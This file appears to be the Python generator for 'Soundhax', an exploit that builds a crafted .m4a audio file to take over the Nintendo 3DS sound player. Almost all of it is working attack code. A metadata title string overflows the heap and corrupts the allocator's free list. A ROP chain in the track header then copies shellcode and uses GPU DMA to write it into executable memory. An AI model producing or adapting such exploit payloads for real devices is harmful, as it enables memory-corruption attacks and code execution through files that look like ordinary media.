#!/usr/bin/env python

from __future__ import division, print_function, unicode_literals
import sys
from struct import pack
from subprocess import call
from constants import STAGE2_SIZE, constants
from os import environ, path, name as osname
from binascii import hexlify, unhexlify

REGION = "usa"
TYPE = "old" # "new"

if len(sys.argv) > 1:
    REGION = sys.argv[1].lower()

if len(sys.argv) > 2:
    TYPE = sys.argv[2].lower()

for name, regions in constants.items():
    if REGION not in regions:
        print("Error: {} does not contain a constant for {}".format(REGION,
                                                                    name))
    globals()[name] = regions[REGION]

def p(x):
    return pack("<I", x)

def pb(x):
    return pack(">I", x)

def get_arm_none_eabi_binutils_exec(name):
    exec_path = path.join(environ["DEVKITARM"], "bin", "arm-none-eabi-{0}".format(name))
    if osname == "nt":
        exec_path = ''.join((exec_path[1], ':', exec_path[2:])).replace('/', '\\')
    return exec_path

def get_shellcode():
    # assemble stage 2
    call([get_arm_none_eabi_binutils_exec("gcc"), "-x", "assembler-with-cpp", "-nostartfiles",
        "-nostdlib", "-D", REGION.upper(), "-D", TYPE.upper(), "-o", "stage2.bin", "stage2.s"])
    # generate raw instruction bytes
    call([get_arm_none_eabi_binutils_exec("objcopy"), "-O", "binary", "stage2.bin"])
    # read in the shellcode
    with open('stage2.bin', 'rb') as f:
        payload = f.read()
        assert len(payload) == STAGE2_SIZE
        return payload

# end = end1 + end2 in the code, pick end2 so end wraps to start+4
desired_end = start + 4 # to make size 4
magic_end = (desired_end - end1) % 2**32
assert (end1 + magic_end) % 2**32 == desired_end

malloc_free_list_head = heapctx + 0x3C

what = fake_free_chunk
where = malloc_free_list_head

r1 = what
r2 = where - 12

UNICODE_MARKER = b'\xff\xfe' # unicode marker

exp = b"<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
exp += b" \x00"*((772-len(exp)) // 2)
assert len(exp) == 772

exp += b"aaaa" # base
exp += p(magic_end) # r3
exp += p(r2) # r2
exp += p(r1) # r1

def pa_to_gpu(pa):
  return pa - 0x0C000000

def gpu_to_pa(gpua):
  return gpua + 0x0C000000

# 16:06:09 @yellows8 | "> readmem:11usr=CtrApp 0x002F5d00 0x100"
# "Using physical address: 0x27bf5d00 (in_address = 0x002f5d00)"
def code_va_to_pa(va):
  if TYPE == "old":
    return va + 0x23D00000
  else:
    return va + 0x27900000

#starts at this pop
#.text:0027DB00 LDMFD           SP!, {R4-R10,PC}

payload = get_shellcode()

rop  = b"AAAA" # r4
rop += b"BBBB" # r5
rop += b"CCCC" # r6
rop += b"DDDD" # r7
rop += b"EEEE" # r8
rop += b"FFFF" # r9
rop += b"GGGG" # r10
rop += p(pop_r0_pc) # pc
rop += p(payload_heap_addr) # dst
rop += p(pop_r1_pc)
rop += p(payload_stack_addr) # src
rop += p(pop_r2_thru_r6_pc) #pc
rop += p(STAGE2_SIZE) #length
rop += b"bbbb" # r3
rop += b"cccc" # r4
rop += b"dddd" # r5
rop += b"eeee" # r6
rop += p(memcpy_gadget) # pc
rop += b"aaaa" # r4
rop += b"bbbb" # r5
rop += b"cccc" # r6
rop += b"dddd" # r7
rop += b"eeee" # r8
rop += b"ffff" # r9
rop += b"gggg" # r10
rop += p(pop_r0_pc)
rop += p(payload_heap_addr) # r0
rop += p(pop_r1_pc)
rop += p(0x1000)
rop += p(gpu_flushcache_gadget)
rop += b"bbbb" # r4
rop += b"cccc" # r5
rop += b"dddd" # r6
rop += p(gpu_enqueue_gadget)
if REGION != 'kor':
    rop += b"aaaa" # skipped
rop += p(4)
rop += p(payload_heap_addr)
rop += p(pa_to_gpu(code_va_to_pa(stage2_code_va)))
rop += p(STAGE2_SIZE)
rop += p(0)
rop += p(0)
rop += p(8)
rop += p(0)
if REGION == 'kor':
    rop += b"aaaa" # skipped (with KOR the above gxcmd buffer is at sp+0 instead of sp+4, but stackframe size is the same)
rop += b"AAAA" # r4
rop += b"AAAA" # r5
rop += b"AAAA" # r6
rop += b"AAAA" # r7
rop += b"AAAA" # r8
rop += b"AAAA" # r9
if REGION != 'kor':
    rop += b"AAAA" # r10
    rop += b"AAAA" # r11
rop += p(pop_r0_pc) # pc
rop += p(0x10000000) # r0
rop += p(pop_r1_pc) # pc
rop += p(0) # r1
rop += p(sleep_gadget) # pc # {R4-R6,LR}
rop += b"aaaa" # r4
rop += b"bbbb" # r5
rop += b"cccc" # r6
rop += p(stage2_code_va)
rop += payload

tkhd_data = b'A'*136 # padding
if REGION != 'kor':
    tkhd_data += b'A'*0x28 # padding
tkhd_data += rop # ROP starts here
tkhd_data += unhexlify(b'00000002000000000000940000000000000000000000000001000000000100000000000000')
tkhd_data += unhexlify(b'0000000000000000010000000000000000000000000000400000000000000000000000')

assert len(tkhd_data) < 0x800 # so we don't allocate off the tail.

l = [(b'ftyp', b'4d344120000000004d3441206d70343269736f6d00000000'),
    (b'mdat', b'00'),
    (b'moov',
        [
        (b'mvhd', b'00'),
        (b'trak',
            [
            (b'tkhd', hexlify(tkhd_data)),
            (b'mdia',
                [
                (b'mdhd', b'00000000aac54f45aac54f4500003e800000940000000000'),
                (b'hdlr', b'0000000000000000736f756e00000000000000000000000000'),
                (b'minf',
                    [
                    (b'smhd', b'0000000000000000'),
                    (b'dinf',
                        [
                        (b'dref', [(b'url ', b'00000001')])
                        ]),
                    (b'stbl',
                        [
                        (b'stsd', [(b'mp4a', [(b'esds', b'000000000380808022000200048080801440150018000000fa000000fa0005808080021408068080800102')])]),
                        (b'stsz', b'00'),
                        (b'stts', b'00000000000000010000002500000400'),
                        (b'stco', b'000000000000000100000028'),
                        (b'stsc', b'0000000000000001000000010000002500000001')
                        ])
                    ])
                ])
            ]),
        (b'udta',
            [(b'meta', [
                (b'hdlr', b'00000000000000006d6469726170706c000000000000000000'),
                (b'ilst',
                    [(b'\xa9nam', [(b'data', b'0000000100000000' + hexlify(UNICODE_MARKER + exp))]),
                     (b'\xa9ART', [(b'data', b'00000001000000004e6564')]),
                     (b'\xa9alb', [(b'data', b'00000001000000004e696e74656e646f2033445320536f756e64')]),
                     (b'\xa9day', [(b'data', b'000000010000000032303030')]),
                     (b'edoc', [(b'data', b'00000001000000003344533100')]),
                     (b'wtfs', [(b'data', b'0000000100000000303032303500')]),
                     (b'dicr', [(b'data', b'0000000100000000343935414236383100')]),
                     (b'dide', [(b'data', b'0000000100000000343935414236383100')]),
                     (b'tmrp', [(b'data', b'000000010000000075706c6f61642c65646974446973747269627574652c6669727374446973747269627574652c7365636f6e644469737472696275746500')])
                     ])
                ])
            ])
        ])
    ]

prefixes = {
    b'meta': b'\x00\x00\x00\x00',
    b'stsd': b'\x00\x00\x00\x00\x00\x00\x00\x01',
    b'dref': b'\x00\x00\x00\x00\x00\x00\x00\x01',
    b'mp4a': b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\x3E\x80\x00\x00'
}

def to_string(tree):
    def internal(tree):
        sz = 0
        ret = b""
        for name, data in tree:
            if type(data) is str or type(data) is bytes:
                rdata = unhexlify(data)
                chunk_size = len(rdata)
            else:
                chunk_size, rdata = internal(data)
                chunk_size
            chunk_size += 8

            prefix = prefixes.get(name, b'')
            rdata = prefix + rdata
            chunk_size += len(prefix)

            sz += chunk_size
            ret += pb(chunk_size) + name + rdata
        return sz, ret
    _, res = internal(tree)
    return res

if TYPE == "new":
    fn = './soundhax-{}-{}.m4a'.format(REGION, "n3ds")
else:
    assert TYPE == "old"
    fn = './soundhax-{}-{}.m4a'.format(REGION, "o3ds")

with open(fn, 'wb') as f:
  f.write(to_string(l))
